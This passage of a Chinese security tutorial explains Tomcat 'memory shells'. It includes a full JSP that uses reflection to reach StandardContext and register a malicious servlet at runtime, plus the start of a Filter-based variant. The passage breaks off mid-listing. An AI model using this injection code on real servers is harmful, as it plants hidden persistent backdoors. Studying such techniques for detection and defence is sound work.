+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">wrapper</span><span class="p">.</span><span class="na">setMultipartConfigElement</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">MultipartConfigElement</span><span class="p">(</span><span class="n">multipartdef</span><span class="p">.</span><span class="na">getLocation</span><span class="p">(),</span><span class="w"> </span><span class="n">maxFileSize</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                                                                     </span><span class="n">maxRequestSize</span><span class="p">,</span><span class="w"> </span><span class="n">fileSizeThreshold</span><span class="p">));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">servlet</span><span class="p">.</span><span class="na">getAsyncSupported</span><span class="p">()</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">wrapper</span><span class="p">.</span><span class="na">setAsyncSupported</span><span class="p">(</span><span class="n">servlet</span><span class="p">.</span><span class="na">getAsyncSupported</span><span class="p">().</span><span class="na">booleanValue</span><span class="p">());</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">wrapper</span><span class="p">.</span><span class="na">setOverridable</span><span class="p">(</span><span class="n">servlet</span><span class="p">.</span><span class="na">isOverridable</span><span class="p">());</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">context</span><span class="p">.</span><span class="na">addChild</span><span class="p">(</span><span class="n">wrapper</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">Entry</span><span class="o">&lt;</span><span class="n">String</span><span class="p">,</span><span class="n">String</span><span class="o">&gt;</span><span class="w"> </span><span class="n">entry</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="n">webxml</span><span class="p">.</span><span class="na">getServletMappings</span><span class="p">().</span><span class="na">entrySet</span><span class="p">())</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">context</span><span class="p">.</span><span class="na">addServletMappingDecoded</span><span class="p">(</span><span class="n">entry</span><span class="p">.</span><span class="na">getKey</span><span class="p">(),</span><span class="w"> </span><span class="n">entry</span><span class="p">.</span><span class="na">getValue</span><span class="p">());</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>一个是处理Servlet的循环，一个是处理URL映射关系的循环，都使用到这个context对象</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">context</span><span class="p">.</span><span class="na">addChild</span><span class="p">(</span><span class="n">wrapper</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">context</span><span class="p">.</span><span class="na">addServletMappingDecoded</span><span class="p">(</span><span class="n">entry</span><span class="p">.</span><span class="na">getKey</span><span class="p">(),</span><span class="w"> </span><span class="n">entry</span><span class="p">.</span><span class="na">getValue</span><span class="p">());</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>那么这个context是什么，我们该如何获取呢？</p>
+<p>可以看到这个context是StandContext，我们可以通过这个路径获取HttpServletRequest.getServletContext.context.context来获取</p>
+<p><img src="/p/servlet-api%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/image/4.png"
+	width="1289"
+	height="520"
+	srcset="/p/servlet-api%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/image/4_hu_35c95280baa9afd2.png 480w, /p/servlet-api%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/image/4_hu_3c4e0377820b6a7a.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="247"
+		data-flex-basis="594px"
+	
+></p>
+<p><img src="/p/servlet-api%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/image/5.png"
+	width="1675"
+	height="796"
+	srcset="/p/servlet-api%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/image/5_hu_a10e745be0cb22e.png 480w, /p/servlet-api%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/image/5_hu_874e0dd1f655330e.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="210"
+		data-flex-basis="505px"
+	
+></p>
+<h3 id="21注入内存马">2.1.注入内存马
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="o">&lt;%</span><span class="err">@</span><span class="w"> </span><span class="n">page</span><span class="w"> </span><span class="n">import</span><span class="o">=</span><span class="s">&#34;java.io.IOException&#34;</span><span class="w"> </span><span class="o">%&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&lt;%</span><span class="err">@</span><span class="w"> </span><span class="n">page</span><span class="w"> </span><span class="n">import</span><span class="o">=</span><span class="s">&#34;java.lang.reflect.Field&#34;</span><span class="w"> </span><span class="o">%&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&lt;%</span><span class="err">@</span><span class="w"> </span><span class="n">page</span><span class="w"> </span><span class="n">import</span><span class="o">=</span><span class="s">&#34;org.apache.catalina.core.StandardContext&#34;</span><span class="w"> </span><span class="o">%&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&lt;%</span><span class="err">@</span><span class="w"> </span><span class="n">page</span><span class="w"> </span><span class="n">import</span><span class="o">=</span><span class="s">&#34;org.apache.catalina.core.ApplicationContext&#34;</span><span class="w"> </span><span class="o">%&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&lt;%</span><span class="err">@</span><span class="w"> </span><span class="n">page</span><span class="w"> </span><span class="n">import</span><span class="o">=</span><span class="s">&#34;org.apache.catalina.Wrapper&#34;</span><span class="w"> </span><span class="o">%&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&lt;%</span><span class="err">@</span><span class="w"> </span><span class="n">page</span><span class="w"> </span><span class="n">language</span><span class="o">=</span><span class="s">&#34;java&#34;</span><span class="w"> </span><span class="n">pageEncoding</span><span class="o">=</span><span class="s">&#34;utf-8&#34;</span><span class="w"> </span><span class="n">contentType</span><span class="o">=</span><span class="s">&#34;text/html; charset=UTF-8&#34;</span><span class="o">%&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&lt;%!</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">ShellServlet</span><span class="w"> </span><span class="kd">extends</span><span class="w"> </span><span class="n">HttpServlet</span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@Override</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">protected</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">doGet</span><span class="p">(</span><span class="n">HttpServletRequest</span><span class="w"> </span><span class="n">request</span><span class="p">,</span><span class="n">HttpServletResponse</span><span class="w"> </span><span class="n">response</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Runtime</span><span class="p">.</span><span class="na">getRuntime</span><span class="p">().</span><span class="na">exec</span><span class="p">(</span><span class="s">&#34;calc&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">%&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&lt;%</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">request</span><span class="p">.</span><span class="na">setCharacterEncoding</span><span class="p">(</span><span class="s">&#34;utf-8&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">response</span><span class="p">.</span><span class="na">setCharacterEncoding</span><span class="p">(</span><span class="s">&#34;utf-8&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">response</span><span class="p">.</span><span class="na">setContentType</span><span class="p">(</span><span class="s">&#34;text/html;charset=UTF-8&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">out</span><span class="p">.</span><span class="na">print</span><span class="p">(</span><span class="s">&#34;memshell&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// 从请求对象获取 ApplicationContext</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">ServletContext</span><span class="w"> </span><span class="n">servletContext</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">request</span><span class="p">.</span><span class="na">getServletContext</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">Field</span><span class="w"> </span><span class="n">applicationContextField</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">servletContext</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&#34;context&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">applicationContextField</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">ApplicationContext</span><span class="w"> </span><span class="n">appContext</span><span class="w">  </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">ApplicationContext</span><span class="p">)</span><span class="n">applicationContextField</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">servletContext</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// 从ApplicationContext中获取StandardContext</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">Field</span><span class="w"> </span><span class="n">standardcontextField</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">appContext</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&#34;context&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">standardcontextField</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">StandardContext</span><span class="w"> </span><span class="n">standardcontext</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">StandardContext</span><span class="p">)</span><span class="n">standardcontextField</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">appContext</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// 注册恶意Servlet</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">Wrapper</span><span class="w"> </span><span class="n">wrapper</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">standardcontext</span><span class="p">.</span><span class="na">createWrapper</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// 传入Servlet名字</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">wrapper</span><span class="p">.</span><span class="na">setName</span><span class="p">(</span><span class="s">&#34;ShellServlet&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// 传入Servlet映射类名+实例化类</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">wrapper</span><span class="p">.</span><span class="na">setServletClass</span><span class="p">(</span><span class="n">ShellServlet</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getName</span><span class="p">());</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">wrapper</span><span class="p">.</span><span class="na">setServlet</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">ShellServlet</span><span class="p">());</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// 将包装器添加到context</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">standardcontext</span><span class="p">.</span><span class="na">addChild</span><span class="p">(</span><span class="n">wrapper</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// 添加路由Servlet映射关系</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">standardcontext</span><span class="p">.</span><span class="na">addServletMappingDecoded</span><span class="p">(</span><span class="s">&#34;/addShell&#34;</span><span class="p">,</span><span class="n">wrapper</span><span class="p">.</span><span class="na">getName</span><span class="p">());</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">%&gt;</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>访问shell.jsp,然后再访问addShell，执行ShellServlet里面的恶意代码</strong></p>
+<p><img src="/p/servlet-api%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/image/6.png"
+	width="2242"
+	height="1017"
+	srcset="/p/servlet-api%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/image/6_hu_f985d0d89d173735.png 480w, /p/servlet-api%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/image/6_hu_43e3d3fad24ef74b.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="220"
+		data-flex-basis="529px"
+	
+></p>
+<h2 id="3filter内存马">3.Filter内存马
+</h2><p><a class="link" href="https://mp.weixin.qq.com/s/l1LojbY9QquSH_5MipDQHw"  target="_blank" rel="noopener"
+    >内存马第二弹——Filter内存马</a></p>
+<p><a class="link" href="https://mp.weixin.qq.com/s/q__4UEJwvhlSKKWCT3h_Sw"  target="_blank" rel="noopener"
+    >Tomcat内存马之Filter内存马剖析</a></p>
+<p><strong>Filter也称之为过滤器，是对Servlet技术的一个强补充。其主要功能是在HttpServletRequest到达 Servlet以及HttpServletResponse到达客户端之前进行拦截，根据需要对其进行检查与修改。主要应用于权限控制、日志记录、性能监控、数据加解密等场景。</strong></p>
+<p><img src="/p/servlet-api%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/image/7.jpg"
+	width="623"
+	height="199"
+	srcset="/p/servlet-api%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/image/7_hu_7ab56e8184415d05.jpg 480w, /p/servlet-api%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/image/7_hu_2091cbb9aba072ed.jpg 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="313"
+		data-flex-basis="751px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">com.example.filtermemshell</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">jakarta.servlet.*</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">jakarta.servlet.http.HttpFilter</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.IOException</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">HelloFilter</span><span class="w"> </span><span class="kd">extends</span><span class="w"> </span><span class="n">HttpFilter</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@Override</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">doFilter</span><span class="p">(</span><span class="n">ServletRequest</span><span class="w"> </span><span class="n">servletRequest</span><span class="p">,</span><span class="w"> </span><span class="n">ServletResponse</span><span class="w"> </span><span class="n">servletResponse</span><span class="p">,</span><span class="w"> </span><span class="n">FilterChain</span><span class="w"> </span><span class="n">filterChain</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="p">,</span><span class="w"> </span><span class="n">ServletException</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">cmd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">servletRequest</span><span class="p">.</span><span class="na">getParameter</span><span class="p">(</span><span class="s">&#34;cmd&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">cmd</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="kd">super</span><span class="p">.</span><span class="na">doFilter</span><span class="p">(</span><span class="n">servletRequest</span><span class="p">,</span><span class="w"> </span><span class="n">servletResponse</span><span class="p">,</span><span class="w"> </span><span class="n">filterChain</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">servletResponse</span><span class="p">.</span><span class="na">setContentType</span><span class="p">(</span><span class="s">&#34;text/plain&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">servletResponse</span><span class="p">.</span><span class="na">getWriter</span><span class="p">().</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;Hello &#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">cmd</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="n">xml</span><span class="w"> </span><span class="n">version</span><span class="o">=</span><span class="s">&#34;1.0&#34;</span><span class="w"> </span><span class="n">encoding</span><span class="o">=</span><span class="s">&#34;UTF-8&#34;</span><span class="o">?&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&lt;</span><span class="n">web</span><span class="o">-</span><span class="n">app</span><span class="w"> </span><span class="n">xmlns</span><span class="o">=</span><span class="s">&#34;https://jakarta.ee/xml/ns/jakartaee&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">         </span><span class="n">xmlns</span><span class="p">:</span><span class="n">xsi</span><span class="o">=</span><span class="s">&#34;http://www.w3.org/2001/XMLSchema-instance&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">         </span><span class="n">xsi</span><span class="p">:</span><span class="n">schemaLocation</span><span class="o">=</span><span class="s">&#34;https://jakarta.ee/xml/ns/jakartaee https://jakarta.ee/xml/ns/jakartaee/web-app_6_0.xsd&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">         </span><span class="n">version</span><span class="o">=</span><span class="s">&#34;6.0&#34;</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="o">&lt;</span><span class="n">filter</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="o">&lt;</span><span class="n">filter</span><span class="o">-</span><span class="n">name</span><span class="o">&gt;</span><span class="n">hellofilter</span><span class="o">&lt;/</span><span class="n">filter</span><span class="o">-</span><span class="n">name</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="o">&lt;</span><span class="n">filter</span><span class="o">-</span><span class="kd">class</span><span class="err">&gt;</span><span class="nc">com</span><span class="p">.</span><span class="na">example</span><span class="p">.</span><span class="na">filtermemshell</span><span class="p">.</span><span class="na">HelloFilter</span><span class="o">&lt;/</span><span class="n">filter</span><span class="o">-</span><span class="kd">class</span><span class="err">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="err">&lt;/</span><span class="nc">filter</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="o">&lt;</span><span class="n">filter</span><span class="o">-</span><span class="n">mapping</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="o">&lt;</span><span class="n">filter</span><span class="o">-</span><span class="n">name</span><span class="o">&gt;</span><span class="n">hellofilter</span><span class="o">&lt;/</span><span class="n">filter</span><span class="o">-</span><span class="n">name</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="o">&lt;</span><span class="n">url</span><span class="o">-</span><span class="n">pattern</span><span class="o">&gt;/*&lt;/</span><span class="n">url</span><span class="o">-</span><span class="n">pattern</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="o">&lt;/</span><span class="n">filter</span><span class="o">-</span><span class="n">mapping</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&lt;/</span><span class="n">web</span><span class="o">-</span><span class="n">app</span><span class="o">&gt;</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/servlet-api%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/image/8.png"
+	width="1015"
+	height="198"
+	srcset="/p/servlet-api%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/image/8_hu_674b2cf014a794c2.png 480w, /p/servlet-api%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/image/8_hu_c9f215152d16dff9.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="512"
+		data-flex-basis="1230px"
+	
+></p>
+<p><strong>那么我们如何能再程序运行时将恶意的Filter加载到Tomcat中呢？</strong></p>
+<p><strong>在filterChain.doFilter(servletRequest,servletResponse)打断点， 这是请求预处理的关键点 。<br>
+跟进doFilter，会发现ApplicationFilterChain类的filters属性中包含了自定义的filter信息。</strong></p>
+<p><img src="/p/servlet-api%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/image/9.png"
+	width="1808"
+	height="1005"
+	srcset="/p/servlet-api%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/image/9_hu_536eb40be978c116.png 480w, /p/servlet-api%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/image/9_hu_9ef6bc73c27944bb.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="179"
+		data-flex-basis="431px"
+	
+></p>
+<h3 id="31注入内存马条件">3.1.注入内存马条件
+</h3><ol>
+<li><strong>获取context，fiterConfig的相关内容都是从context中得到；</strong></li>
+<li><strong>创建filter；</strong></li>
+<li><strong>将filter ，FilterDefs，FilterMaps添加到FilterConfigs中。</strong></li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
